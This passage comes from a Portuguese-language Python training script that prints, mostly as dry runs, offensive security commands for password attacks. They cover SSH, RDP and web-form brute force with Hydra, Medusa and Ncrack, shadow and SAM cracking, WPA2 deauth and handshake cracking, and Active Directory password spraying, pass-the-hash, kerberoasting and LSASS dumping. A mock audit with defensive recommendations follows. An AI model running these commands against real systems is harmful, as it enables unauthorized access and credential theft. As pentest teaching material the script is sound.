    run(f"hydra -l admin -P rockyou.txt {TARGET} http-post-form '/login.php:username=^USER^&password=^PASS^:F=Credenciais incorrectas' -V", dry=True)

    cmd_info("EXEMPLO 4 · RDP (Remote Desktop Protocol — Windows)")
    run(f"hydra -l Administrator -P rockyou.txt rdp://{TARGET} -t 1 -V", dry=True)

    cmd_info("EXEMPLO 5 · FTP brute force")
    run(f"hydra -l ftp_user -P rockyou.txt ftp://{TARGET} -t 8", dry=True)

    cmd_info("EXEMPLO 6 · MySQL brute force")
    run(f"hydra -l root -P rockyou.txt mysql://{TARGET} -t 4", dry=True)

    cmd_info("EXEMPLO 7 · SMTP (e-mail server)")
    run(f"hydra -l user@empresa.ao -P rockyou.txt smtp://{TARGET}:587 -S -t 4", dry=True)
    divider(9)

    # ──────────────────────────────────────────────────────────────
    # 9.3  MEDUSA — Login Paralelo de Alta Velocidade
    # ──────────────────────────────────────────────────────────────
    subsection("9.3 · MEDUSA 🧠 — Login Paralelo de Força Bruta", 9)
    cmd_info("Medusa: brute force massivamente paralelo — mais rápido que Hydra em múltiplos alvos")
    cmd_info("Suporta: SSH, FTP, HTTP, MySQL, MSSQL, SMB, Telnet, VNC, POP3, IMAP...")

    if not check_tool("medusa"):
        warn("Instalar: sudo apt install medusa -y" if not IS_WINDOWS else "Medusa: disponível no Kali/WSL2")
    else:
        success("medusa encontrado no PATH")

    cmd_info("EXEMPLO 1 · SSH com lista de hosts (múltiplos alvos)")
    run("medusa -H hosts.txt -U users.txt -P rockyou.txt -M ssh -t 4 -o medusa_ssh.txt", dry=True)

    cmd_info("EXEMPLO 2 · HTTP Basic Auth")
    run(f"medusa -h {TARGET} -u admin -P rockyou.txt -M http -m DIR:/admin -t 8", dry=True)

    cmd_info("EXEMPLO 3 · FTP paralelo em múltiplos alvos")
    run("medusa -H targets.txt -u ftp -P passwords.txt -M ftp -t 10 -f", dry=True)

    cmd_info("EXEMPLO 4 · MySQL database server")
    run(f"medusa -h {TARGET} -u root -P rockyou.txt -M mysql -t 4 -f", dry=True)
    divider(9)

    # ──────────────────────────────────────────────────────────────
    # 9.4  NCRACK — Cracking de Autenticação de Rede
    # ──────────────────────────────────────────────────────────────
    subsection("9.4 · NCRACK 🦂 — Cracking de Autenticação de Rede", 9)
    cmd_info("Ncrack: ferramenta de alta velocidade da Nmap family — ideal para grandes redes")
    cmd_info("Suporta: SSH, RDP, FTP, Telnet, HTTP, HTTPS, POP3, IMAP, SMB, VNC, PostgreSQL")

    if not check_tool("ncrack"):
        warn("Instalar: sudo apt install ncrack -y" if not IS_WINDOWS else "Download: https://nmap.org/ncrack/")
    else:
        success("ncrack encontrado no PATH")

    cmd_info("EXEMPLO 1 · SSH + RDP em múltiplos alvos")
    run(f"ncrack -p 22,3389 --user administrator,admin -P rockyou.txt {TARGET}/24", dry=True)

    cmd_info("EXEMPLO 2 · SSH com timing agressivo")
    run(f"ncrack -p 22 -U users.txt -P rockyou.txt {TARGET} --timing 5", dry=True)

    cmd_info("EXEMPLO 3 · RDP Windows (cuidado com lockout)")
    run(f"ncrack --user Administrator -P top100.txt rdp://{TARGET} --pairwise", dry=True)

    cmd_info("EXEMPLO 4 · Múltiplos serviços numa passagem")
    run(f"ncrack -U users.txt -P rockyou.txt -p 22,21,3389,23 {TARGET}", dry=True)
    divider(9)

    # ──────────────────────────────────────────────────────────────
    # 9.5  JOHN THE RIPPER — Auditoria de Senhas Local
    # ──────────────────────────────────────────────────────────────
    subsection("9.5 · JOHN THE RIPPER 🕵️ — Auditoria de Senhas Offline", 9)
    cmd_info("John: um dos crackers mais usados — excelente para /etc/shadow, ZIP, PDF, Office...")
    cmd_info("Suporta: Unix shadow, Windows SAM, ZIP, RAR, PDF, SSH keys, Office, KeePass, +100 formatos")

    john_cmd = "john"
    if not check_tool("john") and check_tool("john.exe"):
        john_cmd = "john.exe"
    if not check_tool(john_cmd):
        warn("Instalar: sudo apt install john -y" if not IS_WINDOWS else "Download: https://www.openwall.com/john/")
    else:
        success(f"{john_cmd} encontrado no PATH")

    cmd_info("EXEMPLO 1 · Quebrar /etc/shadow (Linux)")
    run(f"{john_cmd} --wordlist=/usr/share/wordlists/rockyou.txt /etc/shadow {suppress_errors()}", dry=True)

    cmd_info("EXEMPLO 2 · Ficheiro shadow com regras de mutação")
    run(f"{john_cmd} --wordlist=rockyou.txt --rules=best64 shadow.txt", dry=True)

    cmd_info("EXEMPLO 3 · Extrair e quebrar hash de ficheiro ZIP")
    run("zip2john ficheiro.zip > zip_hash.txt", dry=True)
    run(f"{john_cmd} --wordlist=rockyou.txt zip_hash.txt", dry=True)

    cmd_info("EXEMPLO 4 · Extrair e quebrar hash de PDF")
    run("pdf2john documento.pdf > pdf_hash.txt", dry=True)
    run(f"{john_cmd} --wordlist=rockyou.txt pdf_hash.txt", dry=True)

    cmd_info("EXEMPLO 5 · Extrair hashes do SAM (Windows) com samdump2")
    if not IS_WINDOWS:
        run("samdump2 SYSTEM SAM > sam_hashes.txt", dry=True)
        run(f"{john_cmd} --format=NT --wordlist=rockyou.txt sam_hashes.txt", dry=True)
    else:
        info("Windows: use mimikatz/impacket para extrair SAM hashes")

    cmd_info("EXEMPLO 6 · Ver senhas já quebradas")
    run(f"{john_cmd} --show shadow.txt", dry=not check_tool(john_cmd))

    cmd_info("EXEMPLO 7 · Modo incremental (brute-force puro)")
    run(f"{john_cmd} --incremental=digits shadow.txt", dry=True)
    divider(9)

    # ──────────────────────────────────────────────────────────────
    # 9.6  WFUZZ — Fuzzing de Aplicações Web
    # ──────────────────────────────────────────────────────────────
    subsection("9.6 · WFUZZ 🐙 — Fuzzing de Aplicações Web", 9)
    cmd_info("Wfuzz: ferramenta flexível de brute force e fuzzing para web apps")
    cmd_info("Usa FUZZ como placeholder — suporta headers, cookies, POST data, paths, parâmetros")

    if not check_tool("wfuzz"):
        warn("Instalar: pip3 install wfuzz" if not IS_WINDOWS else "pip install wfuzz")
    else:
        success("wfuzz encontrado no PATH")

    WEB_TARGET = "http://192.168.1.100"
    cmd_info("EXEMPLO 1 · Descoberta de directórios e ficheiros")
    run(f"wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 {WEB_TARGET}/FUZZ", dry=True)

    cmd_info("EXEMPLO 2 · Brute force de parâmetros GET")
    run(f"wfuzz -c -z file,rockyou.txt --hc 302 '{WEB_TARGET}/login?password=FUZZ&user=admin'", dry=True)

    cmd_info("EXEMPLO 3 · POST login brute force")
    run(f"wfuzz -c -z file,rockyou.txt -d 'username=admin&password=FUZZ' --hc 200 {WEB_TARGET}/login", dry=True)

    cmd_info("EXEMPLO 4 · Fuzzing de subdomínios")
    run("wfuzz -c -z file,subdomains.txt -H 'Host: FUZZ.empresa.ao' --hc 400,404 http://empresa.ao", dry=True)

    cmd_info("EXEMPLO 5 · Fuzzing com cookie de sessão autenticada")
    run(f"wfuzz -c -z file,paths.txt -b 'PHPSESSID=abc123' --hc 403,404 {WEB_TARGET}/api/FUZZ", dry=True)

    cmd_info("EXEMPLO 6 · Descoberta de extensões de ficheiros")
    run(f"wfuzz -c -z list,php-asp-aspx-jsp-txt-bak -u '{WEB_TARGET}/index.FUZZ' --hc 404", dry=True)
    divider(9)

    # ──────────────────────────────────────────────────────────────
    # 9.7  AIRCRACK-NG — Auditoria de Segurança Wi-Fi
    # ──────────────────────────────────────────────────────────────
    subsection("9.7 · AIRCRACK-NG 📡 — Auditoria de Segurança Wi-Fi", 9)
    cmd_info("Aircrack-ng: suite completa para auditoria de redes sem fio 802.11")
    cmd_info("Componentes: airmon-ng · airodump-ng · aireplay-ng · aircrack-ng · hcxdumptool")

    if IS_WINDOWS:
        warn("Aircrack-ng no Windows tem limitações — recomendado Kali Linux / Alfa USB adapter")
    elif not check_tool("aircrack-ng"):
        warn("Instalar: sudo apt install aircrack-ng -y")
    else:
        success("aircrack-ng encontrado no PATH")

    IFACE = "wlan0"
    BSSID = "AA:BB:CC:DD:EE:FF"
    CH = "6"
    if not IS_WINDOWS:
        cmd_info("PASSO 1 · Activar modo monitor")
        run(f"sudo airmon-ng check kill {suppress_errors()}", dry=True)
        run(f"sudo airmon-ng start {IFACE}", dry=True)

        cmd_info("PASSO 2 · Capturar tráfego (procurar redes)")
        run(f"sudo airodump-ng {IFACE}mon", dry=True)

        cmd_info("PASSO 3 · Focar na rede alvo e capturar handshake WPA2")
        cap_file = path_join(get_temp_dir(), "captura_wpa2")
        run(f"sudo airodump-ng -c {CH} --bssid {BSSID} -w {cap_file} {IFACE}mon", dry=True)

        cmd_info("PASSO 4 · Forçar re-autenticação (deauth attack para capturar handshake)")
        run(f"sudo aireplay-ng -0 5 -a {BSSID} {IFACE}mon", dry=True)

        cmd_info("PASSO 5 · Quebrar handshake WPA2 com wordlist")
        run(f"aircrack-ng -a2 -b {BSSID} -w /usr/share/wordlists/rockyou.txt {cap_file}-01.cap", dry=True)

        cmd_info("PASSO 6 · Converter para formato hc22000 (Hashcat)")
        run(f"hcxpcapngtool -o captura.hc22000 {cap_file}-01.cap {suppress_errors()}", dry=True)
        run(f"hashcat -m 22000 captura.hc22000 rockyou.txt -r rules/wifi.rule", dry=True)

        cmd_info("ALTERNATIVA · PMKID attack (sem deauth, mais furtivo)")
        run(f"sudo hcxdumptool -i {IFACE}mon -o pmkid.pcapng --enable_status=1", dry=True)
        run(f"hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng {suppress_errors()}", dry=True)
        run("hashcat -m 22000 pmkid.hc22000 rockyou.txt", dry=True)
    divider(9)

    # ──────────────────────────────────────────────────────────────
    # 9.8  CRACKMAPEXEC — Pós-Exploração e Validação de Credenciais
    # ──────────────────────────────────────────────────────────────
    subsection("9.8 · CRACKMAPEXEC 👾 — Validação de Credenciais em Rede", 9)
    cmd_info("CrackMapExec (CME/NetExec): pós-exploração e password spraying em Active Directory")
    cmd_info("Protocolos: SMB, LDAP, WinRM, MSSQL, SSH, RDP, SNMP — tudo num único toolkit")

    cme_bin = "nxc" if check_tool("nxc") else ("crackmapexec" if check_tool("crackmapexec") else "cme")
    if not check_tool(cme_bin):
        warn("Instalar: pip3 install crackmapexec  |  ou: sudo apt install crackmapexec -y")
        warn("NetExec (fork moderno): pip3 install netexec  |  comando: nxc")
        cme_bin = "crackmapexec"
    else:
        success(f"{cme_bin} encontrado no PATH")

    DC_IP = "192.168.1.10"
    DOMAIN = "empresa.ao"
    cmd_info("EXEMPLO 1 · Enumerar hosts SMB na rede")
    run(f"{cme_bin} smb 192.168.1.0/24 {suppress_errors()}", dry=True)

    cmd_info("EXEMPLO 2 · Password spraying SMB (1 senha, muitos utilizadores)")
    run(f"{cme_bin} smb 192.168.1.0/24 -u users.txt -p 'Empresa@2025' --continue-on-success {suppress_errors()}", dry=True)

    cmd_info("EXEMPLO 3 · Pass-the-Hash (PTH) com hash NTLM")
    run(f"{cme_bin} smb {DC_IP} -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4' {suppress_errors()}", dry=True)

    cmd_info("EXEMPLO 4 · Kerberoasting via LDAP")
    run(f"{cme_bin} ldap {DC_IP} -u user -p 'Senha123' -d {DOMAIN} --kerberoasting kerb.txt {suppress_errors()}", dry=True)

    cmd_info("EXEMPLO 5 · AS-REP Roasting (contas sem Kerberos pre-auth)")
    run(f"{cme_bin} ldap {DC_IP} -u user -p 'Senha123' -d {DOMAIN} --asreproast asrep.txt {suppress_errors()}", dry=True)

    cmd_info("EXEMPLO 6 · Executar comando remoto via WinRM")
    run(f"{cme_bin} winrm {DC_IP} -u Administrator -p 'Senha123' -x 'whoami /all' {suppress_errors()}", dry=True)

    cmd_info("EXEMPLO 7 · Dump de hashes SAM via SMB (requer admin)")
    run(f"{cme_bin} smb {DC_IP} -u Administrator -p 'Senha123' --sam {suppress_errors()}", dry=True)

    cmd_info("EXEMPLO 8 · Dump LSASS (credenciais em memória)")
    run(f"{cme_bin} smb {DC_IP} -u Administrator -p 'Senha123' -M lsassy {suppress_errors()}", dry=True)
    divider(9)

    # ──────────────────────────────────────────────────────────────
    # 9.9  OPHCRACK — Recuperação com Rainbow Tables (Windows)
    # ──────────────────────────────────────────────────────────────
    subsection("9.9 · OPHCRACK 💻 — Rainbow Tables para Windows", 9)
    cmd_info("Ophcrack: recuperação de senhas Windows usando rainbow tables pré-computadas")
    cmd_info("Eficaz contra LM/NTLM hashes — especialmente senhas alfanuméricas até 14 chars")

    if not check_tool("ophcrack"):
        if IS_WINDOWS:
            info("Download GUI: https://ophcrack.sourceforge.io/")
            info("Tables gratuitas: XP Free / Vista Free (rainbow tables)")
        else:
            warn("Instalar: sudo apt install ophcrack -y")
    else:
        success("ophcrack encontrado no PATH")

    cmd_info("EXEMPLO 1 · Quebrar hash NTLM com rainbow tables (CLI)")
    run("ophcrack -t tables/xp_free_fast -f sam_dump.txt -o resultado.txt", dry=True)

    cmd_info("EXEMPLO 2 · Extrair hashes do SAM (Linux — precisa de acesso ao disco)")
    if not IS_WINDOWS:
        run("sudo samdump2 /media/windows/Windows/System32/config/SYSTEM /media/windows/Windows/System32/config/SAM", dry=True)

    cmd_info("EXEMPLO 3 · Usar RainbowCrack para tabelas customizadas")
    run("rtgen md5 loweralpha-numeric 1 8 0 3800 33554432 0", dry=True)
    run("rtsort *.rt && rcrack . -h 5f4dcc3b5aa765d61d8327deb882cf99", dry=True)
    divider(9)

    # ──────────────────────────────────────────────────────────────
    # 9.10  L0PHTCRACK — Auditoria Windows Corporativa
    # ──────────────────────────────────────────────────────────────
    subsection("9.10 · L0PHTCRACK ⚡ — Auditoria de Senhas Windows Enterprise", 9)
    cmd_info("L0phtCrack: ferramenta comercial de auditoria focada em ambientes Windows corporativos")
    cmd_info("Funcionalidades: importação de AD, auditoria periódica agendada, relatórios executivos")
    info("Website: https://www.l0phtcrack.com/ (versão paga — 30 dias trial)")
    if IS_WINDOWS:
        cmd_info("Exportar hashes do AD para auditoria com L0phtCrack")
        run("ntdsutil 'activate instance ntds' 'ifm' 'create full C:\\ntds_dump' q q", dry=True)
    else:
        cmd_info("L0phtCrack é nativo Windows — use em VM ou via WINE")
        run("wine LC7.exe", dry=True)

    cmd_info("Alternativa open-source para Windows AD: ldapdomaindump + hashcat")
    run(f"ldapdomaindump -u '{DOMAIN}\\user' -p 'Senha123' {DC_IP} -o ldap_dump/ {suppress_errors()}", dry=True)
    divider(9)

    # ──────────────────────────────────────────────────────────────
    # 9.11  BRUTUS — Teste de Autenticação Remota Clássico
    # ──────────────────────────────────────────────────────────────
    subsection("9.11 · BRUTUS 🛡️ / THC-HYDRA · Ferramenta Clássica de Autenticação Remota", 9)
    cmd_info("Brutus: ferramenta clássica Windows (GUI) para testes de autenticação remota")
    cmd_info("Protocolos: HTTP/HTTPS, POP3, FTP, SMB, TELNET, NetBIOS, IMAP, NTP")
    if IS_WINDOWS:
        info("Download Brutus (Windows GUI): https://www.hoobie.net/brutus/")
        cmd_info("Alternativa moderna no Windows: usar Hydra via WSL2 (recomendado)")
    else:
        cmd_info("No Linux use THC-Hydra como substituto moderno do Brutus:")
        run("hydra -l root -P rockyou.txt -t 4 ssh://TARGET -V", dry=True)
    divider(9)

    # ──────────────────────────────────────────────────────────────
    # 9.12  CENÁRIO REAL — AUDITORIA COMPLETA AOFR TECH
    # ──────────────────────────────────────────────────────────────
    scenario_header("AUDITORIA DE SENHAS COMPLETA — EMPRESA ANGOLANA")
    cmd_info("FASE 1 · Obter hashes do Active Directory via impacket")
    run(f"impacket-secretsdump {DOMAIN}/Administrator:'Senha123'@{DC_IP} -just-dc-ntlm -outputfile ad_hashes {suppress_errors()}", dry=True)

    cmd_info("FASE 2 · Quebrar hashes NTLM com Hashcat (GPU)")
    run("hashcat -m 1000 ad_hashes.ntds rockyou.txt -r /usr/share/hashcat/rules/best64.rule -o quebrados.txt --force", dry=True)

    cmd_info("FASE 3 · Password Spraying com NetExec/CME")
    run(f"{cme_bin} smb 192.168.1.0/24 -u users.txt -p 'Empresa@2025' --continue-on-success {suppress_errors()}", dry=True)

    cmd_info("FASE 4 · Kerberoasting + quebrar tickets TGS com Hashcat")
    run(f"impacket-GetUserSPNs {DOMAIN}/user:'Senha123' -dc-ip {DC_IP} -request -outputfile kerb_tickets.txt {suppress_errors()}", dry=True)
    run("hashcat -m 13100 kerb_tickets.txt rockyou.txt -r rules/best64.rule -o kerb_quebrados.txt --force", dry=True)

    cmd_info("FASE 5 · Gerar relatório de contas comprometidas")
    now = datetime.datetime.now().isoformat(timespec="seconds")
    info(f"Auditoria concluída em: {now}")
    info("Analista: Alfredo Ociola Francisco Romano | AOFR TECH · Angola 2025")
    info("Recomendações críticas:")
    recs = [
        "MFA obrigatório em todas as contas — especialmente admins",
        "Política de senhas: mínimo 14 caracteres + complexidade",
        "Bloquear NTLM na rede — forçar Kerberos",
        "Activar Protected Users group no AD",
        "Rotação de service accounts — eliminar SPNs desnecessários",
        "Implementar LAPS para senhas de admin local",
        "Monitorizar eventos 4625, 4771, 4768, 4769 no SIEM",
    ]
    for r in recs:
        info(r)
    divider(9)

    # ──────────────────────────────────────────────────────────────
    # 9.13  REFERÊNCIA RÁPIDA · FERRAMENTAS DE SENHA
    # ──────────────────────────────────────────────────────────────
    subsection("9.13 · REFERÊNCIA RÁPIDA — Todas as Ferramentas", 9)
    tools_ref = [
        ("🐱 Hashcat",        "hashcat -m 1000 hashes.txt rockyou.txt",                          "NTLM offline (GPU)"),
        ("🐱 Hashcat",        "hashcat -m 13100 kerb.txt rockyou.txt",                            "Kerberoast TGS"),
        ("🐱 Hashcat",        "hashcat -m 22000 wpa.hc22000 rockyou.txt",                        "WPA2 WiFi"),
        ("🐉 Hydra",          "hydra -l admin -P list.txt ssh://TARGET",                          "SSH brute force"),
        ("🐉 Hydra",          "hydra -L u.txt -P p.txt TARGET http-post-form '/l:u=^U^&p=^P^:F=fail'", "Web form"),
        ("🧠 Medusa",         "medusa -H hosts.txt -U u.txt -P p.txt -M ssh -t 8",               "SSH multi-host"),
        ("🦂 Ncrack",         "ncrack -p 22,3389 -U u.txt -P p.txt TARGET",                      "SSH+RDP network"),
        ("🕵️ John",           "john --wordlist=rockyou.txt shadow.txt",                           "Linux shadow"),
        ("🕵️ John",           "zip2john file.zip | john --wordlist=rockyou.txt",                  "ZIP password"),
        ("🐙 Wfuzz",          "wfuzz -c -z file,common.txt --hc 404 URL/FUZZ",                   "Dir discovery"),
        ("📡 Aircrack-ng",    "aircrack-ng -a2 -b BSSID -w rockyou.txt cap.cap",                 "WPA2 handshake"),
        ("👾 CrackMapExec",   "cme smb NET/24 -u users.txt -p 'Spray@2025'",                     "Password spray"),
        ("👾 CrackMapExec",   "cme smb DC -u admin -H 'NTLM_HASH'",                              "Pass-the-Hash"),
        ("💻 Ophcrack",       "ophcrack -t tables/xp_free_fast -f sam.txt",                      "Rainbow tables"),
    ]
    print()
    print(C.YELLOW + C.BOLD + "  ▌ QUICK REFERENCE — PASSWORD TOOLS" + C.RESET)
    print(C.LINE + "  " + "─" * 100 + C.RESET)
    for tool, command, desc in tools_ref:
        print(f"  {C.ORANGE}{tool:<18}{C.RESET}  {C.GREEN}{command:<56}{C.RESET}  {C.DIM}{desc}{C.RESET}")
    print()
    divider(9)
    pause_menu()


# ─────────────────────────────────────────────
#  REFERÊNCIA RÁPIDA
# ─────────────────────────────────────────────
def quick_reference():
    section_header(0, "REFERÊNCIA RÁPIDA", "Comandos Essenciais — AOFR TECH · Cross-Platform")
    platform_info()

    tables = {
        "REDE E SCAN": [
            ("nmap -sS -sV -sC -O -p- TARGET",                           "Scan completo profissional"),
            ("nmap --script vuln TARGET",                                  "Scan de vulnerabilidades NSE"),
            ("masscan -p1-65535 TARGET --rate=10000",                     "Scan rápido de portas"),
            ("netstat -ano" if IS_WINDOWS else "ss -tulpn | grep LISTEN", "Portas abertas localmente"),
            ("tshark -r captura.pcap -Y http -T fields -e http.host",     "Filtrar HTTP no pcap"),
        ],
        "PASSWORDS E CREDENCIAIS": [
            ("hashcat -m 1000 hashes.txt rockyou.txt",    "Quebrar hashes NTLM"),
            ("hashcat -m 13100 kerb_hashes.txt rockyou.txt", "Quebrar Kerberoast"),
            ("john --wordlist=rockyou.txt hashes.txt",    "John The Ripper"),
            ("hydra -l admin -P rockyou.txt ssh://IP",    "Brute force SSH"),
        ],
        "EXPLORAÇÃO": [
            ("msfconsole",                                       "Iniciar Metasploit Framework"),
            ("msfvenom -p windows/x64/meterpreter/reverse_tcp ...", "Gerar payload Windows"),
            ("sqlmap -u 'URL?id=1' --dbs --batch",               "SQL Injection automatizado"),
            ("searchsploit 'apache 2.4'",                        "Pesquisar exploits locais"),
        ],
        "FORENSE E IR": [
            ("certutil -hashfile file.exe SHA256" if IS_WINDOWS else "sha256sum ficheiro.img", "Hash SHA-256"),
            ("strings ficheiro | findstr http" if IS_WINDOWS else "strings ficheiro | grep -E 'http|password'", "Extrair strings suspeitas"),
            ("Get-FileHash file.exe" if IS_WINDOWS else "file ficheiro_desconhecido",  "Identificar ficheiro"),
            ("exiftool foto.jpg",                                 "Extrair metadados EXIF"),
            ("vol.py -f ram.dump windows.pslist",                 "Listar processos em dump RAM"),
        ],
        "ACTIVE DIRECTORY": [
            ("bloodhound-python -u user -p pass -d dom.ao -c All", "Recolher dados AD BloodHound"),
            ("impacket-GetUserSPNs dom.ao/user:pass -dc-ip IP -request", "Kerberoasting"),
            ("impacket-GetNPUsers dom.ao/ -usersfile users.txt -no-pass", "AS-REP Roasting"),
            ("impacket-secretsdump dom.ao/admin:pass@IP",         "Dump de hashes do domínio"),
            ("crackmapexec smb 192.168.1.0/24 -u user -p pass",   "Verificar credenciais na rede"),
        ],
        "WINDOWS ESPECÍFICO": [
            ("Get-EventLog -LogName Security -Newest 50",          "Logs de segurança Windows"),
            ("netsh advfirewall show allprofiles",                  "Estado do Firewall Windows"),
            ("reg query HKLM\\SAM /s",                             "Consultar registo SAM"),
            ("schtasks /query /fo LIST /v",                        "Listar tarefas agendadas"),
            ("wmic process list full",                              "Processos detalhados WMIC"),
            ("powershell Get-NetTCPConnection | Where State -eq Listen", "Portas em escuta (PS)"),
        ] if IS_WINDOWS else [],
    }

    for cat, cmds in tables.items():
        if not cmds:
            continue
        color = (C.CYAN if "REDE" in cat else C.ORANGE if "PASSWORD" in cat
                 else C.RED if "EXPLOR" in cat else C.PURPLE if "FORENSE" in cat
                 else C.YELLOW if "ACTIVE" in cat else C.GREEN)
        print()
        print(color + C.BOLD + f"  ▌ {cat}" + C.RESET)
        print(C.LINE + "  " + "─" * 90 + C.RESET)
        for cmd_str, desc in cmds:
            print(f"  {C.GREEN}{cmd_str:<52}{C.RESET}  {C.DIM}{desc}{C.RESET}")
        print()

    pause_menu()

# ─────────────────────────────────────────────
#  MENU PRINCIPAL
# ─────────────────────────────────────────────
def menu():
    areas = [
        (1, "ANALISTA DE SEGURANÇA",      "Blue Team · SIEM · Threat Intel",           C.CYAN),
        (2, "ENGENHEIRO DE SEGURANÇA",    "Firewall · VPN · DevSecOps · Hardening",    C.ORANGE),
        (3, "RESPOSTA A INCIDENTES",      "IR · Contenção · Erradicação · Recuperação", C.GREEN),
        (4, "FORENSE DIGITAL",            "Evidências · Cadeia de Custódia · Tribunal", C.PURPLE),
        (5, "ANALISTA DE MALWARE",        "Engenharia Reversa · YARA · Sandbox",        C.RED),
        (6, "TESTADOR DE PENETRAÇÃO",     "Ethical Hacking · OWASP · Bug Bounty",      C.YELLOW),
        (7, "OPERADOR DE RED TEAM",       "APT Simulation · C2 · Social Engineering",  C.PINK),
        (8, "REFERÊNCIA RÁPIDA",          "Todos os comandos essenciais",               C.WHITE),
        (9, "FERRAMENTAS DE SENHA",       "Hashcat · Hydra · John · Aircrack · CME",   C.ORANGE),
        (0, "SAIR",                       "",                                           C.DIM),
    ]

    while True:
        banner()
        w = shutil.get_terminal_size((100, 30)).columns
        plat = "Windows" if IS_WINDOWS else ("macOS" if IS_MACOS else "Linux")
        print(C.BOLD + C.WHITE + f"  SELECCIONE UMA ÁREA  [{plat}]:" + C.RESET)
        print()
        for num, title, sub, color in areas:
            badge = f"[{num:02d}]" if num > 0 else "[ 0]"
            print(f"  {color}{C.BOLD}{badge}{C.RESET}  {color}{title:<34}{C.RESET}  {C.DIM}{sub}{C.RESET}")
        print()
        print(C.CYAN + "═" * w + C.RESET)
        choice = input(C.CYAN + "  aofr@tech:~$ " + C.RESET).strip()

        fn_map = {
            "1": area_01, "2": area_02, "3": area_03, "4": area_04,
            "5": area_05, "6": area_06, "7": area_07, "8": quick_reference,
            "9": area_09,
        }

        if choice == "0":
            print()
            print(C.ORANGE + C.BOLD + "  AOFR TECH · Atitude · Orientação · Força · Resultado" + C.RESET)
            print(C.DIM    + "  Alfredo Ociola Francisco Romano · Angola 2025" + C.RESET)
            print()
            sys.exit(0)
        elif choice in fn_map:
            fn_map[choice]()
        else:
            warn("Opção inválida. Tente novamente.")
            time.sleep(1)

# ─────────────────────────────────────────────
#  ENTRY POINT
# ─────────────────────────────────────────────
if __name__ == "__main__":
    if sys.version_info < (3, 7):
        print("Python 3.7+ necessário.")
        sys.exit(1)

    # Configurar encoding UTF-8 no Windows
    if IS_WINDOWS:
        try:
            sys.stdout.reconfigure(encoding="utf-8", errors="replace")
            sys.stderr.reconfigure(encoding="utf-8", errors="replace")
            # Activar UTF-8 no CMD: chcp 65001
            os.system("chcp 65001 >nul 2>&1")
        except Exception:
            pass

    if len(sys.argv) > 1:
        area_arg = sys.argv[1]
        fn_map = {
            "1": area_01, "2": area_02, "3": area_03, "4": area_04,
            "5": area_05, "6": area_06, "7": area_07, "8": quick_reference,
            "9": area_09,
        }
        if area_arg in fn_map:
            banner()
            fn_map[area_arg]()
        else:
            python_exe = "python" if IS_WINDOWS else "python3"
            print(f"Uso: {python_exe} aofr_tech_cyberkit.py [1-8]")
    else:
        menu()
